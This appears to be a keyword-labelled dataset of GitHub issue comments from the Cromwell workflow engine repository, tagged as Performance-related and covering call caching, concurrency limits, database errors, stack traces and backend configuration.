Performance,"IIRC the main driver for this was to be able to turn off cache copying. Google bills a bucket owner for egress and not the account copying out of the bucket, so a bucket owner is potentially at the mercy of Cromwell's cache hit routing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1324#issuecomment-324207364:57,cache,cache,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1324#issuecomment-324207364,2,['cache'],['cache']
Performance,"IOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,885 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeStatistics to Failed.; 2016-04-26 18:26:09,888 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163979-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,889 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeMetadata to Failed.; 2016-04-26 18:26:10,263 cromwell-system-akka.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:10798,concurren,concurrent,10798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,"IOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Could not persist runtime attributes; com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_72]; at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_72]; at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_72]; at java.lang.reflect.Constructor.newInstance(Constructor.java:423) ~[na:1.8.0_72]; at com.mysql.jdbc.Util.handleNewInstance(Util.java:400) ~[cromwell.jar:0.19]; at com.mysql.jdbc.Util.getInstance(Util.java:383) ~[cromwell.jar:0.19]; at com.mysql.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:6552,concurren,concurrent,6552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,"IT should be able to get the hash. Anyway, in this case, it's not a big; deal, since this is part of our github testing. On Fri, Aug 11, 2017 at 11:22 AM, Thib <notifications@github.com> wrote:. > It can run the task without having its hash, it just won't try to call; > cache it nor write it to the cache; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk4g7uP1uJPFhouOoyfne9aGXQrA8ks5sXHHBgaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435:271,cache,cache,271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321869435,2,['cache'],['cache']
Performance,"If this is alignment to the human genome reference, each aligning job will require ~8GB of RAM. If you have 10 jobs running concurrently you would want to make sure there are ~80Gb of RAM available. Alternatively, with CallCaching active, you can just re-run the workflow until all tasks have succeeded.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864:124,concurren,concurrently,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6188#issuecomment-796893864,1,['concurren'],['concurrently']
Performance,If this is ever implemented it should be `DEBUG` or a configurable option w/ a warning about the potential performance impact,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625:107,perform,performance,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625,1,['perform'],['performance']
Performance,"If this is really about the file copying like the later comments suggest, it's not even really something that google can solve (or at least, they're not going to). the only way around something like this is for us to not to copy all of those files, which is now possible if a user wants to use the reference call cache scheme. We can only issue so many calls per second so if you have oodles of calls to make it'll take time to work through them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/901#issuecomment-323877533:313,cache,cache,313,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/901#issuecomment-323877533,1,['cache'],['cache']
Performance,"In a scatter of 20500 shards, we ran a task that basically took in one file input and output a glob of files. We first tried this with a glob where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:876,perform,performInitialHandshake,876,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['perform'],['performInitialHandshake']
Performance,"In a sense yes, but it's upstream of it.; Currently if you scatter 10 million wide, Cromwell still creates 10 million EJEAs that are going to ask for a token.; This stops it from even creating EJEAs if it knows they won't be able to run anyway (yet).; To be perfectly honest I just wanted to kinda float the idea as I haven't gotten to precisely measure if it indeed reduces cpu / memory load (I'm strongly guessing yes though since it's less work being done but...).; I wanted to get people's opinion and if it's a no go already I won't bother measuring.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370564846:388,load,load,388,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3356#issuecomment-370564846,1,['load'],['load']
Performance,"In case it helps anyone else: I had the same error message, but in a different context (I wasn't using docker compose. Instead, I was trying to set up a local backend run using a limited number of CPUs via the `concurrent-job-limit` configuration value, as described on these pages: [1](https://cromwell.readthedocs.io/en/stable/Configuring/), [2](https://cromwell.readthedocs.io/en/stable/backends/Backends/#backend-job-limits), [3](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/README.md)). I ended up fixing the error by changing the value for the `backend.providers.LocalExample.config.submit-docker` option in my configuration file. I.e. initially, I was using the value from the [example config file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/cromwell.example.backends/LocalExample.conf), but for some reason this was giving me an error. When I replaced it with an updated version obtained from [this internal cromwell file](https://github.com/broadinstitute/cromwell/blob/b9b1adef95bea3c74db8534736b61625b6c66ebe/core/src/main/resources/reference_local_provider_config.inc.conf), it started working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288:211,concurren,concurrent-job-limit,211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6353#issuecomment-1451569288,1,['concurren'],['concurrent-job-limit']
Performance,"In general, I feel that the DB calls should be used as sparingly as possible to have good scalability. And Miguel may be right here I believe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201069170:90,scalab,scalability,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201069170,1,['scalab'],['scalability']
Performance,"In my FireCloud workflow, call caching is turned on by default. ; <img width=""1153"" alt=""screen shot 2018-06-07 at 8 57 27 am"" src=""https://user-images.githubusercontent.com/10040800/41101026-f1183d66-6a30-11e8-9fc0-75486f87e18f.png"">. and I also just realized that within the same workflow, some early tasks have the cache results recognized (Hit), for example:; <img width=""509"" alt=""screen shot 2018-06-07 at 9 03 24 am"" src=""https://user-images.githubusercontent.com/10040800/41101331-debd6938-6a31-11e8-903a-c6bf9c6e85e6.png"">; However, once it reaches to one task (M2), which splits the job based on scatter count (in my case, it is 50, basically, each subjob will only take care of a fraction of genome), I think the fraction of genome each job takes care of in different runs should be the same because no parameter has changed. But quite unexpectedly, the subjob cant recognize previous run (Miss). for example:; <img width=""905"" alt=""screen shot 2018-06-07 at 9 19 38 am"" src=""https://user-images.githubusercontent.com/10040800/41102077-f3d8fde4-6a33-11e8-8e24-0c13ada5865a.png"">. If I can't copy whatever successfully finished in previous subjobs, i have to start the whole 50 subjobs every time, it will dramatically increase my cost and time and there is no guarantee that new job will finish successfully because of those transient error. . Maybe there is something I am missing to set up call caching correctly, but as a newbie, I can't figure out myself. . Thanks all in advance",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395418531:318,cache,cache,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3740#issuecomment-395418531,1,['cache'],['cache']
Performance,"In terms of demonstrating concurrency, I'd be happy with having the code currently in the `CheckExecutionStatus` handler log the calls it thinks are runnable and having the test scrape the logs to validate correctness. Initially this should be just `ps`, subsequently it should be both `cgrep` and `wc` **at the same time**. I don't care if `cgrep` and `wc` actually run at the same time, I just care that this logic realizes they both become runnable at the same time. Making these things actually run concurrently would likely be fairly involved, especially given my currently weak Akka TestKit-fu.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297:26,concurren,concurrency,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103239297,2,['concurren'],"['concurrency', 'concurrently']"
Performance,"In theory it shouldn't make a difference.* Cromwell isn't scheduling anything, it's merely seeing what is runnable and launching it. Thus the time delta should be miniscule. However, in the real world there are things such as quotas on the backend and that could make a difference, yes. But keep in mind that backends will themselves process job requests differently and aren't necessarily going to honor the order we send them in anyways. Thus, in my opinion this sort of general optimization is going to be folly as we can never guarantee the underlying behavior anyways. To your primary point, I get what you're saying although my experience has been that every time someone has stated that a behavior should be X as it matches the real world I find someone telling me that the opposite behavior matches the real world. :) This is one of those cases. This one is more complex in that we also hear differing opinions on the whole workflow level (ie should workflows be processed as many at once as possible or optimizing for throughput for any individual workflow). At the end of the day the limiting factor is going to be the backend set up and whatever quotas are in place. * Yes, there is a global job limit but this can be tweaked as high as one would like, so effectively not an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2736#issuecomment-336137269:481,optimiz,optimization,481,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2736#issuecomment-336137269,3,"['optimiz', 'throughput']","['optimization', 'optimizing', 'throughput']"
Performance,"Incidental finding, no immediate action required:. > The Performance Schema tables are intended to replace the INFORMATION_SCHEMA tables, which are deprecated as of MySQL 5.7.6 and are removed in MySQL 8.0. . https://dev.mysql.com/doc/refman/5.7/en/upgrading-from-previous-series.html. It looks like the new performance schema is available on 5.6 but is not enabled on our prod config (requires flag)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153:57,Perform,Performance,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-870944153,2,"['Perform', 'perform']","['Performance', 'performance']"
Performance,Instead of creating a future in the actor could you create a separate actor which would perform the blocking operation and pass it back?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257681928:88,perform,perform,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257681928,1,['perform'],['perform']
Performance,Is call-cache unavailable if you use the Singularity image file?. Is there a solution? How do I configure it?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094:8,cache,cache,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047358094,1,['cache'],['cache']
Performance,"Is there an example of how to set call caching to true and allowResultReuse to true in the `-o options` file when running a workflow. I am looking for examples and the documentation and I just keep guessing. Both ways of setting outside of `callCaching` and inside still have my `-m metadata` file showing below:; ```. ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ```. options.json file:; ```; {; 	""default_runtime_attributes"": {; 		""write_to_cache"": true,; 		""read_from_cache"": true,; 		""system.file-hash-cache"": true,; 		""allowResultReuse"" : true,; 		""callCaching"": {; 			""hit"": false,; 			""effectiveCallCachingMode"": ""ReadAndWriteCache"",; 			""result"": ""Cache Miss"",; 			""allowResultReuse"": true; 		}; 	}; }; ```. EDIT:; This only worked by creating a config file with lines:; ```; call-caching {; enabled = true; }; ```; If this is required, shouldn't this documentation [page](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/) include that information under section ""Call Caching Options""?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913:557,cache,cache,557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5246#issuecomment-773541913,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,Is this the SFS version of invalidate cache results? Can we also update the centaur test `invalidate_bad_caches` to include whatever causes this?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1999#issuecomment-280664752:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1999#issuecomment-280664752,1,['cache'],['cache']
Performance,Is upping `queueSize` the answer here?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297416609:11,queue,queueSize,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-297416609,1,['queue'],['queueSize']
Performance,"Issue was resolved and issue was due to launch template of EC2 and It; should be launched with ssm agent installed on it .; Better option is to use Amazon genomics cli . When you deploy a Context agc; will create batch queues and s3 for you . It's better to use that queue and; s3 in cromwell cofig .; It works better. Regards,; Divya. On Fri, Apr 8, 2022 at 3:13 AM thousand-petalled ***@***.***>; wrote:. > Hey @DivyaThottappilly <https://github.com/DivyaThottappilly> do you; > still have this issue? I'm trying to get up and running a basic Hello World; > but keeps getting an S3Exception null error (301).; >; > It seems like you've already past that stage and if you don't mind, could; > you help me setup this?; >; > —; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1092523379>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AGA4NTQVWHYKZC7RLKGT4OTVD7MCNANCNFSM5N3DE7QQ>; > .; > You are receiving this because you were mentioned.Message ID:; > ***@***.***>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127:219,queue,queues,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6671#issuecomment-1274196127,2,['queue'],"['queue', 'queues']"
Performance,"It can run the task without having its hash, it just won't try to call cache it nor write it to the cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808:71,cache,cache,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321842808,2,['cache'],['cache']
Performance,It may be worth setting the queue size to something huge or even unlimited as a stop gap measure. In the settings conf file set put in database -> db `queueSize = -1`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311529864:28,queue,queue,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2381#issuecomment-311529864,2,['queue'],"['queue', 'queueSize']"
Performance,"It seems likely that the size optimization was made independent of knowing how completely and utterly borked Cromwell becomes (unable to run WDLs!), so I still feel that a pass of PO input is valuable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480395219:30,optimiz,optimization,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4802#issuecomment-480395219,1,['optimiz'],['optimization']
Performance,It seems that @TMiguelT has already addressed part of [this issue](https://github.com/hpcng/singularity/issues/2597). . The singularity cache is not meant as a replacement for storing your images. It is merely meant as a way to avoid downloading too much. . It seems we have to hack something together in bash or contribute something upstream. I think bash hacking can be fairly succesful but it will be very ugly. The requirements for the cache:; * Make use of singularity's layer cache to avoid too much downloading.; * Should be thread safe. Singularity 3.6.0 commands will use a threadsafe cache. Older version will have to use a universal file lock.; * Will put all `.sif` images in a single shared location.; * Will check if a file exists before pulling. This will mean a cache-first approach. Internet outages should not affect workflows that have already run several times.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844:136,cache,cache,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631402844,5,['cache'],"['cache', 'cache-first']"
Performance,"It'd be nice to show off the task runtime options in these tests too, e.g. ""don't write to cache"" and ""don't read from cache""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164567205:91,cache,cache,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164567205,2,['cache'],['cache']
Performance,"It's a dependency resolution error, which seems surprising. I cleared Travis cache and restarted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-505586193:77,cache,cache,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-505586193,1,['cache'],['cache']
Performance,"It's possible there could be race conditions with this: submissions that were accepted but haven't been persisted yet, or persisted workflows that don't have workflow actors yet. I'm starting to think that state data is more useful than I originally thought...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201066311:29,race condition,race conditions,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201066311,1,['race condition'],['race conditions']
Performance,"It's really a question of time and cost efficiency, but since we've got the; actual GATK team and joint calling authors working on the pipeline we'll; definitely take advantage of all the features there are (and they'll write; the ones we need!). ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Thu, Jun 23, 2016 at 11:55 AM, Paul Grosu notifications@github.com; wrote:. > @kcibul https://github.com/kcibul I believe GATK can perform; > incremental joint calling, so then you should be able to use a collection; > of Cromwells submissions to build it up. Would that work?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103,; > or mute the thread; > https://github.com/notifications/unsubscribe/ABW4gxuO55o58LyKHTfSEVvS97Z1-7Nxks5qOqxWgaJpZM4I8rmu; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228109757:520,perform,perform,520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228109757,1,['perform'],['perform']
Performance,It's still possible to flood MySQL but that's another problem with a different solution and requires a lot more load. This was closed by #1836,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-274632528:112,load,load,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-274632528,1,['load'],['load']
Performance,Iterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.bui,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7095,load,loader,7095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loader']
Performance,"JobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }; ```; Thanks for any tips or pointers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:4518,queue,queue,4518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,2,['queue'],['queue']
